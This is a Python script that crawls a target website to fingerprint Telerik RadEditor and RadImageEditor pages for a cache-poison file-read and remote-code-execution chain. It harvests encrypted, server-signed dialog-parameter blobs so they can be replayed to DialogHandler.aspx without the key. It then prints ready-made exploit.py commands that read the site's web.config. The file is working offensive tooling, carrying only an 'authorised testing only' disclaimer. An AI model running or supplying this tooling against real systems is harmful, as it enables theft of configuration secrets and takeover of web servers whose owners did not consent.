#!/usr/bin/env python3
"""
Telerik RadEditor / RadImageEditor discovery scraper.

Crawls a target site (same origin) and fingerprints pages that render a control
usable by the RadImageEditor cache-poison file-read / RCE chain:

  * Standalone RadImageEditor  -> poison directly            (exploit.py --page <p>)
  * RadEditor (emits an encrypted ImageEditor `dp`)          (exploit.py --via-dialog
                                                              --dialog-page <p>)

The decisive marker for the DialogHandler path is the encrypted ImageEditor
dialog-parameters blob the RadEditor emits in its RadDialogOpener bootstrap:

    "ImageEditor":{ ... "SerializedParameters":"Aw..." }

That blob is a server-signed `dp` the application hands out for free, so it can
be replayed to the always-present Telerik.Web.UI.DialogHandler.aspx without any
knowledge of the DialogParametersEncryptionKey / machineKey.

The presence of DialogHandler.aspx alone is NOT exploitable. It only consumes
a `dp`; a rendered RadEditor is what mints one. This tool finds that producer.

Authorised testing only.
"""
import argparse
import re
import sys
from collections import deque
from urllib.parse import urljoin, urlparse, urldefrag

import requests

# --- fingerprints -----------------------------------------------------------

# The harvestable ImageEditor dp (RadEditor path). Group 1 = the encrypted blob.
IMAGEEDITOR_DP_RE = re.compile(
    r'"ImageEditor"\s*:\s*\{.*?"SerializedParameters"\s*:\s*"([^"]+)"', re.S)

# RadEditor rendered on the page (dialog opener / client bootstrap).
RADEDITOR_SIGS = [
    ("RadEditor $create", re.compile(r'Telerik\.Web\.UI\.RadEditor\b')),
    ("_dialogDefinitions", re.compile(r'_dialogDefinitions')),
    ("dialogParametersHolder", re.compile(r'dialogParametersHolder')),
]

# Standalone RadImageEditor that issues its own download keys (direct poison).
RADIMAGEEDITOR_CREATE_RE = re.compile(r'Telerik\.Web\.UI\.RadImageEditor\b')
RADIMAGEEDITOR_CS_RE = re.compile(r'name="(RadImageEditor\d+_ClientState)"', re.I)
DOWNLOADKEY_RE = re.compile(r'"_downloadKey"\s*:\s*"')

# RadSpell also emits a dp, but only for its spell dialog (not ImageEditor); noted
# for completeness, not usable for this chain.
RADSPELL_RE = re.compile(r'Telerik\.Web\.UI\.RadSpell\b')

# Generic Telerik presence -- distinguishes "uses Telerik" from "renders an editor".
TELERIK_PRESENT_RE = re.compile(
    r'Telerik\.Web\.UI\.WebResource\.axd|RadScriptManager|Telerik\.Web\.UI', re.I)

# Same-origin links worth following. Skip static assets / handlers.
HREF_RE = re.compile(r'(?:href|action)\s*=\s*["\']([^"\'#>]+)', re.I)
SKIP_EXT = re.compile(
    r'\.(?:js|css|png|jpe?g|gif|svg|ico|woff2?|ttf|eot|map|axd|ashx|asmx|zip|pdf|'
    r'json|xml|txt|mp4|webm|woff)(?:\?|$)', re.I)


def looks_like_page(url):
    """Follow HTML-ish, same-origin URLs; skip obvious static assets/handlers."""
    path = urlparse(url).path.lower()
    if SKIP_EXT.search(path):
        return False
    return True


def classify(body):
    """Return a dict describing which controls a page body exposes."""
    info = {
        "radeditor": [name for name, rx in RADEDITOR_SIGS if rx.search(body)],
        "imageeditor_dp": None,
        "standalone_rie": None,
        "radspell": bool(RADSPELL_RE.search(body)),
        "telerik": bool(TELERIK_PRESENT_RE.search(body)),
    }
    m = IMAGEEDITOR_DP_RE.search(body)
    if m:
        info["imageeditor_dp"] = m.group(1)
    if RADIMAGEEDITOR_CREATE_RE.search(body) and DOWNLOADKEY_RE.search(body):
        cs = RADIMAGEEDITOR_CS_RE.search(body)
        info["standalone_rie"] = cs.group(1) if cs else "RadImageEditor?_ClientState"
    return info


def extract_links(base_url, body):
    out = set()
    for m in HREF_RE.finditer(body):
        raw = m.group(1).strip()
        if not raw or raw.lower().startswith(("javascript:", "mailto:", "tel:", "data:")):
            continue
        u = urldefrag(urljoin(base_url, raw))[0]
        out.add(u)
    return out


def check_dialoghandler(base, session, timeout):
    """Fingerprint the DialogHandler sink (present != exploitable)."""
    url = base.rstrip("/") + "/Telerik.Web.UI.DialogHandler.aspx"
    try:
        r = session.get(url, params={"checkHandler": "1"}, timeout=timeout)
        return "HandlerCheckOK" in r.text or "HandlerCheckOK" in (
            r.headers.get("title", "") or "")
    except requests.RequestException:
        return None


def crawl(base, seeds, max_pages, max_depth, timeout, session, verbose):
    origin = urlparse(base)
    start = [urldefrag(urljoin(base + "/", s))[0] for s in seeds]
    q = deque((u, 0) for u in start)
    seen = set()
    results = {}  # url -> info

    while q and len(seen) < max_pages:
        url, depth = q.popleft()
        if url in seen:
            continue
        seen.add(url)
        try:
            r = session.get(url, timeout=timeout, allow_redirects=True)
        except requests.RequestException as e:
            if verbose:
                print("  [!] %s -> %s" % (url, e), file=sys.stderr)
            continue
        ctype = r.headers.get("Content-Type", "")
        if "html" not in ctype.lower():
            continue
        body = r.text
        info = classify(body)
        if info["radeditor"] or info["imageeditor_dp"] or info["standalone_rie"]:
            results[url] = info
        if verbose:
            flag = "*" if url in results else " "
            print("  [%s] (d%d) %s" % (flag, depth, url), file=sys.stderr)

        if depth < max_depth:
            for link in extract_links(url, body):
                p = urlparse(link)
                if p.scheme in ("http", "https") and p.netloc == origin.netloc \
                        and link not in seen and looks_like_page(link):
                    q.append((link, depth + 1))

    return results, len(seen)


def main():
    ap = argparse.ArgumentParser(
        description="Crawl a site and find RadEditor / RadImageEditor entrypoints "
                    "for the RadImageEditor cache-poison chain.")
    ap.add_argument("base", help="target base URL, e.g. http://host:8083")
    ap.add_argument("--seed", action="append", default=[],
                    help="additional seed path(s) to start crawling from "
                         "(default: / and /Default.aspx). Repeatable.")
    ap.add_argument("--max-pages", type=int, default=300,
                    help="maximum pages to fetch (default: 300)")
    ap.add_argument("--max-depth", type=int, default=3,
                    help="maximum crawl depth from the seeds (default: 3)")
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument("--show-dp", action="store_true",
                    help="print the full harvested ImageEditor dp blob")
    ap.add_argument("-v", "--verbose", action="store_true",
                    help="log every fetched URL to stderr")
    a = ap.parse_args()

    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": "Mozilla/5.0 (RadEditor-recon)"})

    seeds = a.seed or ["/", "/Default.aspx"]
    base = a.base.rstrip("/")

    sink = check_dialoghandler(base, s, a.timeout)
    print("[*] DialogHandler.aspx sink: %s" % (
        "present (HandlerCheckOK)" if sink else
        "not detected" if sink is False else "unknown"))
    print("[*] crawling %s (max_pages=%d, max_depth=%d)..."
          % (base, a.max_pages, a.max_depth))

    results, fetched = crawl(base, seeds, a.max_pages, a.max_depth,
                             a.timeout, s, a.verbose)
    print("[*] fetched %d pages; %d with editor markers\n" % (fetched, len(results)))

    dp_pages, rie_pages = [], []
    for url, info in sorted(results.items()):
        path = urlparse(url).path
        bits = []
        if info["standalone_rie"]:
            bits.append("STANDALONE RadImageEditor (%s)" % info["standalone_rie"])
            rie_pages.append(path)
        if info["imageeditor_dp"]:
            bits.append("RadEditor + harvestable ImageEditor dp")
            dp_pages.append(path)
        elif info["radeditor"]:
            bits.append("RadEditor [%s] (no ImageEditor dp?)" % ", ".join(info["radeditor"]))
        if info["radspell"]:
            bits.append("RadSpell (spell dp only, not usable)")
        print("  %s" % url)
        print("      %s" % "; ".join(bits))
        if a.show_dp and info["imageeditor_dp"]:
            print("      dp = %s" % info["imageeditor_dp"])

    # actionable summary
    print("\n=== exploitable entrypoints ===")
    if not dp_pages and not rie_pages:
        print("  none found (no rendered RadEditor / RadImageEditor discovered).")
        print("  Note: DialogHandler.aspx presence alone is not exploitable -- a")
        print("  rendered RadEditor is required to mint the encrypted dp.")
    for p in rie_pages:
        print("  [standalone] python3 exploit.py %s --page %s --file web.config" % (base, p.lstrip('/')))
    for p in dp_pages:
        print("  [via-dialog] python3 exploit.py %s --page %s --via-dialog --file web.config"
              % (base, p.lstrip('/')))


if __name__ == "__main__":
    main()
